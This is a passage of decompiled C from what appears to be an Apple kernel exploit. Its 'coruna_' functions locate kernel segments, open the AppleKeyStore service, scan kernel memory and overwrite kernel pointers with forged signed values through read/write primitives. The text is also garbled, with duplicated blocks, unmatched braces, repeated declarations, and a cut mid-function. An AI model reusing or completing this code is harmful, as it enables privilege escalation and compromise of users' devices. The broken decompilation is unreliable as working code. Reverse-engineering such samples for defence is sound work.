          arg[0x14] = n - serial_8;
        }
      }
      if ((type_id_16 >> 6 & 1) != 0) {
        return 1;
      }
      flags = (int *)(*(long *)arg[0x1a] + 0x20);
      status = (int *)((long)flags + (unsigned long)*(uint *)(*(long *)arg[0x1a] + 0x14));
      if (flags < status) {
        port = 0;
        status = false;
        type_id_18 = (long)(int)arg[7] - 1;
        type_id_8 = n;
        do {
          kind = type_id_8;
          if (*flags == 0x19) {
            err = flags + 2;
            i = _strcmp((char *)err,"__TEXT");
            if (i == 0) {
              arg[0x1f] = n - *(long *)(flags + 6);
            }
            if (((type_id_16 >> 8 & 1) != 0) && (i = _strcmp((char *)err,"__KLD"), i == 0)) {
              status = true;
            }
            type_id_20 = port;
            if ((((type_id_16 & 0x580) != 0x180) && (*(long *)(flags + 8) != 0)) &&
               (type_id_20 = *(long *)(flags + 6) + *(long *)(flags + 8), type_id_20 <= port)) {
              type_id_20 = port;
            }
            if ((((type_id_16 >> 10 & 1) != 0) && (*(long *)(flags + 8) != 0)) &&
               (kind = *(unsigned long *)(flags + 6), type_id_8 <= kind || kind == 0)) {
              kind = type_id_8;
            }
            i = _strcmp((char *)err,"__LINKEDIT");
            port = type_id_20;
            if (i == 0) {
              lpau1 = (uint8_t (*) [16])(flags + 8);
              port = NEON_ext(*lpau1,*lpau1,8,1);
              port = *(long *)*lpau1 + *(long *)(flags + 6);
              if ((type_id_16 & 0x580) != 0x180) {
                port = type_id_20;
              }
              arg[2] = *(long *)(flags + 6);
              arg[4] = port;
              arg[3] = port;
            }
          }
          flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
          type_id_8 = kind;
        } while (flags < status);
        if (((uint)!status & type_id_16 >> 8) != 0) {
          return 0;
        }
        if (port == 0) {
          return 0;
        }
        if ((((type_id_16 ^ 0xffffffff) & 0x500) == 0) && (arg[0x14] != 0)) {
          kind = arg[0x14];
        }
        if (kind != n) {
          n = kind & (type_id_18 ^ 0xffffffffffffffff);
        }
        port = port + type_id_18 & (type_id_18 ^ 0xffffffffffffffff);
        if (n <= port) {
          arg[0x1c] = n;
          arg[0x1d] = port - n;
          i = coruna_vm_deallocate_1210c(arg,m);
          return (unsigned long)(i != 0);
        }
      }
    }
  }
  return 0;
}





bool coruna_call_find_text_exec_11034(void)
{
  int err;
  
  err = coruna_find_kld_segment();
  return err != 0;
}





void coruna_kernel09_via_vm_deallocate_120b8(uint64_t *val)
{
  uint64_t *ptr;
  
  coruna_vm_deallocate_120b8();
  ptr = (uint64_t *)val[0x1a];
  if (ptr != (uint64_t *)0x0) {
    if ((void *)*ptr != (void *)0x0) {
      _free((void *)*ptr);
      ptr = (uint64_t *)val[0x1a];
      *ptr = 0;
    }
    _free(ptr);
    val[0x1a] = 0;
  }
  if ((void *)*val != (void *)0x0) {
    _free((void *)*val);
    *val = 0;
  }
  if ((void *)val[0x21] != (void *)0x0) {
    _free((void *)val[0x21]);
    val[0x21] = 0;
  }
  return;
}
void coruna_thread_policy_set_1b42c_2(uint64_t *val,uint64_t *id_2,long handle)
{
  int err;
  char *ptr;
  uint64_t u;
  uint64_t size;
  long handle;
  long addr;
  long off;
  unsigned long version;
  unsigned long port;
  uint64_t tag;
  int status;
  uint64_t scratch;
  uint64_t scratch;
  uint32_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint32_t host_info;
  long serial_buf;
  
  version = k_kernel_rodata_word_400e0;
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  ptr = _strstr(k_kernel_rodata_word_400d8,"T8020");
  size = k_kernel_rodata_word_0003b358;
  tag = k_kernel_rodata_word_3b350;
  u = k_kernel_rodata_word_3b340;
  if (ptr == (char *)0x0) {
    val[1] = k_kernel_rodata_word_0003b348;
    *val = u;
    val[3] = size;
    val[2] = tag;
    val[4] = k_kernel_rodata_word_3b3e0;
    *(uint32_t *)(val + 5) = 0x2bcb05c8;
    thread_attr = k_kernel_rodata_word_3b3e8;
    scratch = 0xffffffffffffffff;
    u = coruna_return_zero_3820c_stub(id_2,&thread_attr,&scratch,2);
    val[6] = u;
    tag = k_kernel_rodata_word_0003b378;
    u = k_kernel_rodata_word_3b370;
    bootargs = k_kernel_rodata_word_0003b368;
    thread_attr = k_kernel_rodata_word_3b360;
    scratch = k_kernel_rodata_word_0003b378;
    scratch = k_kernel_rodata_word_3b370;
    size = coruna_return_zero_3820c_stub(id_2,&thread_attr,&scratch,4);
    val[7] = size;
    bootargs = k_kernel_rodata_word_0003b388;
    thread_attr = k_kernel_rodata_word_3b380;
    scratch = tag;
    scratch = u;
    u = coruna_return_zero_3820c_stub(id_2,&thread_attr,&scratch,4);
    val[8] = u;
    thread_attr = k_kernel_rodata_word_3b3f0;
    scratch = 0xffffffffffffffff;
    u = coruna_return_zero_3820c_stub(id_2,&thread_attr,&scratch,2);
    val[9] = u;
    if (version < 0x918c5a83400) {
      status = -0x56fcfd81;
      thread_attr = k_kernel_rodata_word_3b3f8;
      scratch = 0xffffffffffffffff;
      u = coruna_return_zero_3820c_stub(id_2,&thread_attr,&scratch,2);
    }
    else {
      thread_attr = k_kernel_rodata_word_3b400;
      scratch = 0xffffffffffffffff;
      u = coruna_return_zero_3820c_stub(id_2,&thread_attr,&scratch,2);
      status = -0x56fcfd21;
    }
    val[10] = u;
    thread_attr = k_kernel_rodata_word_3b408;
    bootargs = coruna_u64_pack((bootargs), (0x72a003a2));
    scratch = 0xffffffffffffffff;
    scratch = coruna_u64_pack((scratch), (0xffffffff));
    u = coruna_return_zero_3820c_stub(id_2,&thread_attr,&scratch,3);
    val[0xb] = u;
    thread_attr = k_kernel_rodata_word_3b410;
    scratch = 0xff000000ffffffff;
    handle = coruna_return_zero_3820c_stub(id_2,&thread_attr,&scratch,2);
    val[0xc] = handle + 8;
    bootargs = k_kernel_rodata_word_0003b398;
    thread_attr = k_kernel_rodata_word_3b390;
    scratch = 0xffffffffffffffff;
    scratch = 0xffffffffffffffff;
    u = coruna_return_zero_3820c_stub(id_2,&thread_attr,&scratch,4);
    val[0xd] = u;
    bootargs = k_kernel_rodata_word_0003b3a8;
    thread_attr = k_kernel_rodata_word_3b3a0;
    scratch = 0xffffffffffffffff;
    scratch = 0xffffffffffffffff;
    handle = coruna_return_zero_3820c_stub_2(id_2,&thread_attr,&scratch,4);
    val[0xf] = handle + -8;
    tag = *(uint64_t *)(handle + 0x20);
    u = coruna_kernel6544_via_nop_stub_6_2(handle,handle + 0x10);
    addr = coruna_kernel6544_via_ctx_test_flag_6(tag,u);
    handle = 0;
    do {
      off = coruna_ret_stub_2(id_2,*id_2,addr + handle);
      err = coruna_ret_stub_2(id_2,*id_2,addr + handle + 8);
      if (((uint)off & 0xfc000000) == 0x94000000 && err == status) {
        val[0xe] = addr + ((off << 0x26) >> 0x24) + handle;
        break;
      }
      handle = handle + 4;
    } while ((int)handle != 0x1000);
    tag = *(uint64_t *)(handle + 0x20);
    u = coruna_kernel6544_via_nop_stub_6_2(handle,val[0xf] + 0x18);
    addr = coruna_kernel6544_via_ctx_test_flag_6(tag,u);
    handle = 0;
    do {
      off = coruna_ret_stub_2(id_2,*id_2,addr + handle);
      if ((((uint)off & 0xfc000000) == 0x94000000) &&
         (addr + handle + ((off << 0x26) >> 0x24) == val[0xe])) {
        addr = addr + handle;
        handle = 0;
        status = -0x6ffe940;
        if (version < 0x918c5a83400) {
        status = -0x6ffe9a0;
        }
        do {
        off = addr + handle;
        err = coruna_ret_stub_2(id_2,*id_2,off);
        version = coruna_ret_stub_2(id_2,*id_2,off + 4U);
        port = coruna_ret_stub_2(id_2,*id_2,off + 8);
        val[0x10] =
        (off + 4U & 0xfffffffffffff000) +
        (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
        (unsigned long)((uint)(port >> 7) & 0x7ff8);
        bootargs = k_kernel_rodata_word_0003b428;
        thread_attr = k_kernel_rodata_word_3b420;
        host_info = k_kernel_rodata_word_3b430;
        scratch = k_kernel_rodata_word_0003b43c;
        scratch = k_kernel_rodata_word_3b434;
        bootargs = k_kernel_rodata_word_3b444;
        handle = coruna_return_zero_3820c_stub(id_2,&thread_attr,&scratch,5);
        val[0x11] = handle;
        version = coruna_ret_stub_2(id_2,*id_2,handle + 4);
        port = coruna_ret_stub_2(id_2,*id_2,val[0x11] + 8);
        u = 0;
        val[0x11] =
        (val[0x11] + 4 & 0xfffffffffffff000) +
        (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
        (unsigned long)((uint)(port >> 7) & 0x7ff8);
        }
        else {
        u = 5;
        }
        if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
        return;
        } while ((int)handle != -0x80);
        off = 0;
        version = coruna_ret_stub_2(id_2,*id_2,off + 4U);
        port = coruna_ret_stub_2(id_2,*id_2,off + 8);
        val[0x10] =
        (off + 4U & 0xfffffffffffff000) +
        (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
        (unsigned long)((uint)(port >> 7) & 0x7ff8);
        bootargs = k_kernel_rodata_word_0003b428;
        thread_attr = k_kernel_rodata_word_3b420;
        host_info = k_kernel_rodata_word_3b430;
        scratch = k_kernel_rodata_word_0003b43c;
        scratch = k_kernel_rodata_word_3b434;
        bootargs = k_kernel_rodata_word_3b444;
        handle = coruna_return_zero_3820c_stub(id_2,&thread_attr,&scratch,5);
        val[0x11] = handle;
        version = coruna_ret_stub_2(id_2,*id_2,handle + 4);
        port = coruna_ret_stub_2(id_2,*id_2,val[0x11] + 8);
        u = 0;
        val[0x11] =
        (val[0x11] + 4 & 0xfffffffffffff000) +
        (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
        (unsigned long)((uint)(port >> 7) & 0x7ff8);
        }
        else {
        u = 5;
        }
        if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
        return;
      }
      handle = handle + 4;
    } while ((int)handle != 0x300);
    addr = 0;
fail:
    handle = 0;
    status = -0x6ffe940;
    if (version < 0x918c5a83400) {
      status = -0x6ffe9a0;
    }
    do {
      off = addr + handle;
      err = coruna_ret_stub_2(id_2,*id_2,off);
      version = coruna_ret_stub_2(id_2,*id_2,off + 4U);
      port = coruna_ret_stub_2(id_2,*id_2,off + 8);
      val[0x10] =
      (off + 4U & 0xfffffffffffff000) +
      (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
      (unsigned long)((uint)(port >> 7) & 0x7ff8);
      bootargs = k_kernel_rodata_word_0003b428;
      thread_attr = k_kernel_rodata_word_3b420;
      host_info = k_kernel_rodata_word_3b430;
      scratch = k_kernel_rodata_word_0003b43c;
      scratch = k_kernel_rodata_word_3b434;
      bootargs = k_kernel_rodata_word_3b444;
      handle = coruna_return_zero_3820c_stub(id_2,&thread_attr,&scratch,5);
      val[0x11] = handle;
      version = coruna_ret_stub_2(id_2,*id_2,handle + 4);
      port = coruna_ret_stub_2(id_2,*id_2,val[0x11] + 8);
      u = 0;
      val[0x11] =
      (val[0x11] + 4 & 0xfffffffffffff000) +
      (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
      (unsigned long)((uint)(port >> 7) & 0x7ff8);
      }
      else {
      u = 5;
      }
      if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
      return;
    } while ((int)handle != -0x80);
    off = 0;
done:
    version = coruna_ret_stub_2(id_2,*id_2,off + 4U);
    port = coruna_ret_stub_2(id_2,*id_2,off + 8);
    val[0x10] =
         (off + 4U & 0xfffffffffffff000) +
         (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
         (unsigned long)((uint)(port >> 7) & 0x7ff8);
    bootargs = k_kernel_rodata_word_0003b428;
    thread_attr = k_kernel_rodata_word_3b420;
    host_info = k_kernel_rodata_word_3b430;
    scratch = k_kernel_rodata_word_0003b43c;
    scratch = k_kernel_rodata_word_3b434;
    bootargs = k_kernel_rodata_word_3b444;
    handle = coruna_return_zero_3820c_stub(id_2,&thread_attr,&scratch,5);
    val[0x11] = handle;
    version = coruna_ret_stub_2(id_2,*id_2,handle + 4);
    port = coruna_ret_stub_2(id_2,*id_2,val[0x11] + 8);
    u = 0;
    val[0x11] =
         (val[0x11] + 4 & 0xfffffffffffff000) +
         (long)(int)((uint)(version >> 0x12) & 0x1800 | (int)(version >> 5) << 0xd) * 2 +
         (unsigned long)((uint)(port >> 7) & 0x7ff8);
  }
  else {
    u = 5;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail(u);
}





unsigned long coruna_thread_switch_1aa90(unsigned long arg)

{
  int count;
  unsigned long type_id_14;
  uint u;
  unsigned long size;
  
  count = *(int *)(arg + 0x14);
  size = arg;
  while (count != 0) {
    type_id_14 = tpidr_el0;
    if ((type_id_14 & 0xffc) != 0) {
      u = _thread_switch(*(mach_port_name_t *)(arg + 0x14),0,0);
      size = (unsigned long)u;
    }
    count = *(int *)(arg + 0x14);
  }
  return size;
}
void coruna_ioservicegetmatchingservice_1aadc(long *handle,uint32_t *size)
{
  uint32_t u;
  uint64_t size;
  uint64_t version;
  unsigned long port;
  long handle;
  uint64_t tag;
  long addr;
  long off;
  unsigned long kind;
  uint64_t type_id;
  uint64_t scratch;
  uint64_t scratch;
  
  u = *(uint32_t *)k_kernel_kiomasterportdefault_slot;
  version = _IOServiceMatching("AppleKeyStore");
  version = _IOServiceGetMatchingService(u,version);
  _IOServiceOpen(version,*(uint32_t *)k_kernel_mach_task_self_slot,0,size);
  port = coruna_nop_stub_5(*handle,*size);
  version = coruna_kernel6544_via_nop_stub_6_2(*handle,port + 0x48);
  *(uint64_t *)(size + 6) = version;
  version = coruna_kernel6544_via_nop_stub_6_2(*handle,port);
  *(uint64_t *)(size + 8) = version;
  handle = coruna_kernel6544_via_ctx_test_flag_6(*(uint64_t *)(*handle + 0x20),version);
  size = k_kernel_rodata_word_0003b3b8;
  version = k_kernel_rodata_word_3b3b0;
  scratch = k_kernel_rodata_word_0003b3b8;
  scratch = k_kernel_rodata_word_3b3b0;
  tag = (**(void (**)(*(long *)handle[1] + 8))((long *)handle[1],k_kernel_rodata_word_400a0,2,&scratch);
  *(uint64_t *)(size + 4) = tag;
  type_id = *(uint64_t *)(*handle + 0x20);
  tag = coruna_kernel6544_via_nop_stub_6_2(*handle,handle + (unsigned long)k_kernel_rodata_word_40048);
  tag = coruna_kernel6544_via_ctx_test_flag_6(type_id,tag);
  off = *(long *)(size + 4);
  kind = (unsigned long)k_kernel_rodata_word_40048;
  addr = *handle;
  tag = (**(void (**)(*(long *)handle[1] + 0x10))
                    ((long *)handle[1],tag,
                     off + kind & 0xffffffffffff | (unsigned long)k_kernel_rodata_word_4004a << 0x30);
  coruna_kernel6544_via_nop_stub_7_2(addr,off + kind,tag,1);
  type_id = *(uint64_t *)(*handle + 0x20);
  tag = coruna_kernel6544_via_nop_stub_6_2(*handle,handle + (unsigned long)k_kernel_rodata_word_4004c);
  tag = coruna_kernel6544_via_ctx_test_flag_6(type_id,tag);
  off = *(long *)(size + 4);
  kind = (unsigned long)k_kernel_rodata_word_4004c;
  addr = *handle;
  tag = (**(void (**)(*(long *)handle[1] + 0x10))
                    ((long *)handle[1],tag,
                     off + kind & 0xffffffffffff | (unsigned long)k_kernel_rodata_word_4004e << 0x30);
  coruna_kernel6544_via_nop_stub_7_2(addr,off + kind,tag,1);
  type_id = *(uint64_t *)(*handle + 0x20);
  tag = coruna_kernel6544_via_nop_stub_6_2(*handle,handle + (unsigned long)k_kernel_rodata_word_40050);
  tag = coruna_kernel6544_via_ctx_test_flag_6(type_id,tag);
  off = *(long *)(size + 4);
  kind = (unsigned long)k_kernel_rodata_word_40050;
  addr = *handle;
  tag = (**(void (**)(*(long *)handle[1] + 0x10))
                    ((long *)handle[1],tag,
                     off + kind & 0xffffffffffff | (unsigned long)k_kernel_rodata_word_40052 << 0x30);
  coruna_kernel6544_via_nop_stub_7_2(addr,off + kind,tag,1);
  type_id = *(uint64_t *)(*handle + 0x20);
  tag = coruna_kernel6544_via_nop_stub_6_2(*handle,handle + (unsigned long)k_kernel_rodata_word_40054);
  tag = coruna_kernel6544_via_ctx_test_flag_6(type_id,tag);
  off = *(long *)(size + 4);
  kind = (unsigned long)k_kernel_rodata_word_40054;
  addr = *handle;
  tag = (**(void (**)(*(long *)handle[1] + 0x10))
                    ((long *)handle[1],tag,
                     off + kind & 0xffffffffffff | (unsigned long)k_kernel_rodata_word_40056 << 0x30);
  coruna_kernel6544_via_nop_stub_7_2(addr,off + kind,tag,1);
  type_id = *(uint64_t *)(*handle + 0x20);
  tag = coruna_kernel6544_via_nop_stub_6_2(*handle,handle + (unsigned long)k_kernel_rodata_word_40058);
  tag = coruna_kernel6544_via_ctx_test_flag_6(type_id,tag);
  off = *(long *)(size + 4);
  kind = (unsigned long)k_kernel_rodata_word_40058;
  addr = *handle;
  tag = (**(void (**)(*(long *)handle[1] + 0x10))
                    ((long *)handle[1],tag,
                     off + kind & 0xffffffffffff | (unsigned long)k_kernel_rodata_word_4005a << 0x30);
  coruna_kernel6544_via_nop_stub_7_2(addr,off + kind,tag,1);
  type_id = *(uint64_t *)(*handle + 0x20);
  tag = coruna_kernel6544_via_nop_stub_6_2(*handle,handle + (unsigned long)k_kernel_rodata_word_4005c);
  tag = coruna_kernel6544_via_ctx_test_flag_6(type_id,tag);
  off = *(long *)(size + 4);
  kind = (unsigned long)k_kernel_rodata_word_4005c;
  addr = *handle;
  tag = (**(void (**)(*(long *)handle[1] + 0x10))
                    ((long *)handle[1],tag,
                     off + kind & 0xffffffffffff | (unsigned long)k_kernel_rodata_word_4005e << 0x30);
  coruna_kernel6544_via_nop_stub_7_2(addr,off + kind,tag,1);
  type_id = *(uint64_t *)(*handle + 0x20);
  tag = coruna_kernel6544_via_nop_stub_6_2(*handle,handle + (unsigned long)k_kernel_rodata_word_40060);
  tag = coruna_kernel6544_via_ctx_test_flag_6(type_id,tag);
  off = *(long *)(size + 4);
  kind = (unsigned long)k_kernel_rodata_word_40060;
  addr = *handle;
  tag = (**(void (**)(*(long *)handle[1] + 0x10))
                    ((long *)handle[1],tag,
                     off + kind & 0xffffffffffff | (unsigned long)k_kernel_rodata_word_40062 << 0x30);
  coruna_kernel6544_via_nop_stub_7_2(addr,off + kind,tag,1);
  type_id = *(uint64_t *)(*handle + 0x20);
  tag = coruna_kernel6544_via_nop_stub_6_2(*handle,handle + (unsigned long)k_kernel_rodata_word_40070);
  tag = coruna_kernel6544_via_ctx_test_flag_6(type_id,tag);
  off = *(long *)(size + 4);
  kind = (unsigned long)k_kernel_rodata_word_40070;
  addr = *handle;
  tag = (**(void (**)(*(long *)handle[1] + 0x10))
                    ((long *)handle[1],tag,
                     off + kind & 0xffffffffffff | (unsigned long)k_kernel_rodata_word_40072 << 0x30);
  coruna_kernel6544_via_nop_stub_7_2(addr,off + kind,tag,1);
  type_id = *(uint64_t *)(*handle + 0x20);
  tag = coruna_kernel6544_via_nop_stub_6_2(*handle,handle + (unsigned long)k_kernel_rodata_word_40064);
  tag = coruna_kernel6544_via_ctx_test_flag_6(type_id,tag);
  handle = *(long *)(size + 4);
  kind = (unsigned long)k_kernel_rodata_word_40064;
  addr = *handle;
  tag = (**(void (**)(*(long *)handle[1] + 0x10))
                    ((long *)handle[1],tag,
                     handle + kind & 0xffffffffffff | (unsigned long)k_kernel_rodata_word_40066 << 0x30);
  coruna_kernel6544_via_nop_stub_7_2(addr,handle + kind,tag,1);
  handle = *(long *)(size + 4);
  kind = (unsigned long)k_kernel_rodata_word_4006c;
  addr = *handle;
  tag = (**(void (**)(*(long *)handle[1] + 0x10))
                    ((long *)handle[1],k_kernel_rodata_word_40078,
                     handle + kind & 0xffffffffffff | (unsigned long)k_kernel_rodata_word_4006e << 0x30);
  coruna_kernel6544_via_nop_stub_7_2(addr,handle + kind,tag,1);
  handle = *(long *)(size + 4);
  kind = (unsigned long)k_kernel_rodata_word_40068;
  addr = *handle;
  tag = (**(void (**)(*(long *)handle[1] + 0x10))
                    ((long *)handle[1],k_kernel_rodata_word_40078 + 4,
                     handle + kind & 0xffffffffffff | (unsigned long)k_kernel_rodata_word_4006a << 0x30);
  coruna_kernel6544_via_nop_stub_7_2(addr,handle + kind,tag,1);
  handle = *(long *)(size + 4);
  kind = (unsigned long)k_kernel_rodata_word_40064;
  addr = *handle;
  tag = (**(void (**)(*(long *)handle[1] + 0x10))
                    ((long *)handle[1],k_kernel_rodata_word_40078 + 4,
                     handle + kind & 0xffffffffffff | (unsigned long)k_kernel_rodata_word_40066 << 0x30);
  coruna_kernel6544_via_nop_stub_7_2(addr,handle + kind,tag,1);
  scratch = size;
  scratch = version;
  addr = (**(void (**)(*(long *)handle[1] + 8))((long *)handle[1],k_kernel_rodata_word_400a0,2,&scratch);
  *(long *)(size + 2) = addr;
  coruna_kernel6544_via_nop_stub_7_2(*handle,addr + 0x10,0,1);
  coruna_kernel6544_via_nop_stub_7_2(*handle,port + 0x48,*(uint64_t *)(size + 2),1);
  coruna_call_mach_vm_machine_attribute(*handle,port + 0x9c,0x111,1);
  addr = *handle;
  version = (**(void (**)(*(long *)handle[1] + 0x20))
                    ((long *)handle[1],*(uint64_t *)(size + 4),
                     port & 0xffffffffffff | 0xcda1000000000000);
  coruna_kernel6544_via_nop_stub_7_2(addr,port,version,1);
  scratch = *(uint64_t *)(size + 2);
  version = (**(void (**)(*(long *)handle[1] + 8))((long *)handle[1],k_kernel_rodata_word_400b0,1,&scratch);
  coruna_vm_protect(*(uint64_t *)(*handle + 0x20),version,size + 10);
  **(uint64_t **)(size + 10) = 0;
  return;
}





void coruna_ioserviceclose(long *handle,uint32_t *size)
{
  long handle;
  uint64_t scratch;
  uint64_t scratch;
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  handle = coruna_nop_stub_5(*handle,*size);
  coruna_kernel6544_via_nop_stub_7_2(*handle,handle + 0x48,*(uint64_t *)(size + 6),1);
  coruna_kernel6544_via_nop_stub_7_2(*handle,handle,*(uint64_t *)(size + 8),1);
  coruna_call_mach_vm_machine_attribute(*handle,handle + 0x9c,0,1);
  coruna_mach_port_deallocate_2d808(*(uint64_t *)(*handle + 0x20),size + 10);
  scratch = *(uint64_t *)(size + 2);
  scratch = 0x4000;
  (**(void (**)(*(long *)handle[1] + 8))((long *)handle[1],k_kernel_rodata_word_400a8,2,&scratch);
  scratch = *(uint64_t *)(size + 4);
  scratch = 0x4000;
  (**(void (**)(*(long *)handle[1] + 8))((long *)handle[1],k_kernel_rodata_word_400a8,2,&scratch);
  _IOServiceClose(*size);
  *size = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_kernel6544_residual_248(long handle)
{
  uint64_t scratch;
  uint64_t scratch;
  
  scratch = k_kernel_rodata_word_0003b3b8;
  scratch = k_kernel_rodata_word_3b3b0;
  scratch = (**(void (**)(**(long **)(handle + 8) + 8))
                       (*(long **)(handle + 8),k_kernel_rodata_word_400a0,2,&scratch);
  (**(void (**)(**(long **)(handle + 8) + 8))(*(long **)(handle + 8),k_kernel_rodata_word_400b0,1,&scratch);
  (**(void (**)(**(long **)(handle + 8) + 0x30))(*(long **)(handle + 8),0x12);
  (**(void (**)(**(long **)(handle + 8) + 0x30))(*(long **)(handle + 8),0x10);
  return;
}
void coruna_thread_policy_set_1b360(long handle,uint64_t *val)
{
  mach_port_t lm1;
  long *ptr;
  unsigned long u;
  uint64_t scratch;
  uint64_t scratch;
  
  ptr = (long *)*val;
  while (*ptr != 0) {
    _sched_yield();
    ptr = (long *)*val;
  }
  u = tpidr_el0;
  while ((u & 0xffc) != 0) {
    lm1 = _mach_thread_self();
    _thread_switch(lm1,0,0);
    u = tpidr_el0;
  }
  scratch = k_kernel_rodata_word_0003b3c8;
  scratch = k_kernel_rodata_word_3b3c0;
  lm1 = _mach_thread_self();
  _thread_policy_set(lm1,2,(thread_policy_t)&scratch,4);
  (**(void (**)(**(long **)(handle + 8) + 0x30))(*(long **)(handle + 8),0x35);
  *(uint64_t *)*val = 2;
  return;
}
void coruna_thread_policy_set_1b42c(long *handle)
{
  unsigned long u;
  uint8_t *ptr;
  bool err;
  mach_port_t lm4;
  uint size;
  char *ptr;
  long handle;
  uint64_t version;
  unsigned long port;
  long addr;
  long off;
  pthread_t p_Var12;
  unsigned long tag;
  unsigned long kind;
  long base;
  pthread_t p_Var16;
  long ctx_val;
  long serial;
  long serial_7;
  long serial_8;
  int err;
  uint64_t type_id;
  pthread_t p_Var23;
  long serial_9;
  long serial_10;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long *serial_buf;
  long *action;
  long block_ctx;
  unsigned long scratch;
  unsigned long stack_guard;
  uint64_t bootargs;
  pthread_t sa_saved;
  long sa_new;
  pthread_t path_buf;
  uint8_t *tmp_buf;
  uint64_t region;
  void (*plist)(void);
  uint8_t *url_buf;
  long *json_buf;
  long frame;
  uint64_t work;
  uint64_t thread_attr;
  unsigned long cache;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t cache_20;
  long *cache_21;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t cache_22;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  pthread_t cache_23;
  pthread_t p_Stack_298;
  pthread_t cache_24 [64];
  long cache_25;
  
  u = k_kernel_rodata_word_400e0;
  cache_25 = *(long *)k_kernel_stack_chk_guard_slot;
  ptr = _strstr(k_kernel_rodata_word_400d8,"T8020");
  if (ptr == (char *)0x0) {
    sa_saved = 0;
    cache_22 = 0;
    path_buf = 0;
    sa_new = 0;
    cache_21 = (long *)0x0;
    cache_20 = 0;
    stack_guard = 0;
    block_ctx = 0;
    host_info = 0;
    cache = 0;
    action = 0;
    serial_buf = 0;
    coruna_ioservicegetmatchingservice_1aadc(handle,&cache);
    thread_attr = k_kernel_rodata_word_0003b3d8;
    work = k_kernel_rodata_word_3b3d0;
    lm4 = _mach_thread_self();
    _thread_policy_set(lm4,2,(thread_policy_t)&work,4);
    p_Var23 = k_kernel_rodata_word_0003b3b8;
    p_Var16 = k_kernel_rodata_word_3b3b0;
    p_Stack_298 = k_kernel_rodata_word_0003b3b8;
    cache_23 = k_kernel_rodata_word_3b3b0;
    handle = (**(void (**)(*(long *)handle[1] + 8))((long *)handle[1],k_kernel_rodata_word_400a0,2,&cache_23);
    coruna_kernel6544_via_nop_stub_7_2(*handle,handle,0xbee5000000010003,1);
    coruna_kernel6544_via_nop_stub_7_2(*handle,handle + 8,handle + 0x100,1);
    coruna_kernel6544_via_nop_stub_7_2(*handle,handle + 0x10,handle + 0x200,1);
    coruna_kernel6544_via_nop_stub_7_2(*handle,handle + 0x18,handle + 0x300,1);
    p_Stack_298 = p_Var23;
    cache_23 = p_Var16;
    version = (**(void (**)(*(long *)handle[1] + 8))((long *)handle[1],k_kernel_rodata_word_400a0,2,&cache_23);
    while (port = (**(void (**)(*(long *)handle[1] + 0x30))((long *)handle[1],0x30),
          (port & 0xff) == 6) {
      coruna_kernel6544_residual_248(handle);
    }
    if (port == 0) {
      addr = coruna_kernel6544_via_nop_stub_6_2(*handle,version);
      off = *handle;
      type_id = *(uint64_t *)(off + 0x20);
      version = coruna_kernel6544_via_nop_stub_6_2(off,*(long *)(off + 0x10) + 0x28);
      off = coruna_kernel6544_via_ctx_test_flag_6(type_id,version);
      type_id = *(uint64_t *)(*handle + 0x20);
      version = coruna_kernel6544_via_nop_stub_6_2(*handle,off + 0x40);
      version = coruna_kernel6544_via_ctx_test_flag_6(type_id,version);
      p_Stack_298 = p_Var23;
      cache_23 = p_Var16;
      p_Var12 = (pthread_t)
                (**(void (**)(*(long *)handle[1] + 8))((long *)handle[1],k_kernel_rodata_word_400a0,2,&cache_23)
      ;
      coruna_kernel6544_via_nop_stub_7_2(*handle,p_Var12,0,1);
      cache_24[0] = p_Var12;
      (**(void (**)(*(long *)handle[1] + 8))((long *)handle[1],k_kernel_rodata_word_400b0,1,cache_24);
      while (port = (**(void (**)(*(long *)handle[1] + 0x30))((long *)handle[1],10),
            (port & 0xff) == 6) {
        coruna_kernel6544_residual_248(handle);
      }
      if (port == 0) {
        k_kernel_rodata_word_400004008 = 0x41414141;
        version = coruna_kernel6544_via_nop_stub_6_2(*handle,version);
        port = coruna_kernel6544_via_nop_stub_6_2(*handle,version);
        cache_24[0] = (pthread_t)(port & 0xffffffffc000);
        off = (**(void (**)(*(long *)handle[1] + 8))((long *)handle[1],k_kernel_rodata_word_400b8,1,cache_24)
        ;
        port = coruna_kernel6544_via_nop_stub_6_2(*handle,off + 0x1000);
        cache_24[0] = (pthread_t)(port & 0xffffffffc000);
        tag = (**(void (**)(*(long *)handle[1] + 8))((long *)handle[1],k_kernel_rodata_word_400b8,1,cache_24)
        ;
        kind = coruna_kernel6544_via_nop_stub_6_2(*handle,tag + 8);
        port = kind & 0xffff000000003fff | port & 0xffffffffc000;
        p_Stack_298 = p_Var23;
        cache_23 = p_Var16;
        base = (**(void (**)(*(long *)handle[1] + 8))
                           ((long *)handle[1],k_kernel_rodata_word_400a0,2,&cache_23);
        off = *handle;
        version = (**(void (**)(*(long *)handle[1] + 0x10))
                          ((long *)handle[1],k_kernel_rodata_word_40098,&k_kernel_slot_5070);
        coruna_kernel6544_via_nop_stub_7_2(off,base + 0x40,version,1);
        p_Stack_298 = p_Var23;
        cache_23 = p_Var16;
